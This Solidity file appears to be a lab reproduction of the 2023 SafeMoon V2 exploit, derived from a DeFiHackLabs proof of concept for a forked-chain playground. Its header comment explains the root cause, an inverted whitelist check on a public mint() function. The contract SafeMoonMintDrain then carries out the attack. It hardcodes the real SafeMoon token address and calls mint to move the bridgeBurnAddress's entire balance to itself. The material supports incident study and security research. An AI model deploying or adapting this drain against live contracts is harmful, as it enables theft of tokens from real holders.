// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Synthetic standalone exploit for the EVM Playground (2023-03-safeMoon).
//
// The DeFiHackLabs PoC (test/safeMoon_exp.sol, `SafemoonAttackerTest`) runs the
// whole attack INLINE in the Foundry test contract — there is no standalone
// exploit contract, `attacker` IS the test contract itself (it even implements
// `IPancakeCallee` for the flash-swap variant, `testBurn`). This file mirrors
// `testMint()` only: the anvil_state.json dump backing this PoC is frozen at
// fork block 26,854,757, which matches `testMint`'s fork exactly, but is one
// dumped snapshot BEFORE `testBurn`'s required fork block (26,864,889) — and
// the dump only contains 6 accounts (the SafeMoon proxy, implementation,
// router, and 3 EOAs), none of which is the flash-swap PancakePair, WBNB, or
// the SafeSwap trade router that `testBurn` needs. So only the `mint` bug is
// reproducible against this state; `run()` below is a faithful, minimal copy
// of `testMint()`'s body. Profit is measured on THIS contract's own SFM
// balance (config sets profitReceiver: "exploit") rather than forwarded to
// an attacker EOA: SafeMoon's normal `transfer()` path enforces
// `_maxTxAmount` (5,000,000,000 * 1e9 wei at this block) via `_transfer`,
// and the minted amount (~81.8B SFM, 9 decimals) exceeds it — forwarding
// would revert on a check the real bug never has to pass. `mint()` itself
// bypasses `_transfer`/`_maxTxAmount` entirely by calling `_tokenTransfer`
// directly, which is exactly the unguarded primitive the bug abuses; the
// balance simply stays on the exploit contract, matching `testMint()`'s own
// assertion (`sfmoon.balanceOf(address(this))`).
//
// Root cause: SafeMoon V2's `mint(address user, uint256 amount)` is `public`
// and gated only by `onlyWhitelistMint`, whose check is INVERTED —
// `require(!whitelistMint[msg.sender], "Invalid")` requires the caller to be
// ABSENT from the whitelist mapping, which defaults to false for every
// address. So the "whitelist" gate lets EVERYONE through by default (the only
// way to be blocked is for the owner to explicitly add you to the mapping via
// `setWhitelistMint`, which nobody ever calls against themselves). The
// function body is `_tokenTransfer(bridgeBurnAddress, user, amount, 0, false)`
// — an unconditional, fee-free transfer of `amount` SFM FROM the
// `bridgeBurnAddress` (a wallet meant to hold tokens migrated/bridged out of
// circulation, not a mintable reserve) TO whatever `user` the caller names.
// Passing `sfmoon.balanceOf(bridgeBurnAddress)` as `amount` drains that
// address's entire balance to the caller in one call, with zero
// authorization and zero payment.

interface ISafemoon {
    function bridgeBurnAddress() external returns (address);
    function balanceOf(address account) external view returns (uint256);
    function mint(address user, uint256 amount) external;
}

contract SafeMoonMintDrain {
    ISafemoon public constant SFMOON = ISafemoon(0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5);

    address public immutable attacker;

    constructor(address attacker_) {
        attacker = attacker_;
    }

    function run() external {
        // The vulnerable call: mint() has no real access control (see root
        // cause above), so anyone can name themselves `user` and mint out the
        // bridgeBurnAddress's entire balance for free. The minted balance is
        // kept on this contract (see file header) — mirroring testMint()'s
        // own sfmoon.balanceOf(address(this)) assertion.
        address bridgeBurn = SFMOON.bridgeBurnAddress();
        uint256 drainable = SFMOON.balanceOf(bridgeBurn);
        SFMOON.mint(address(this), drainable);
    }
}
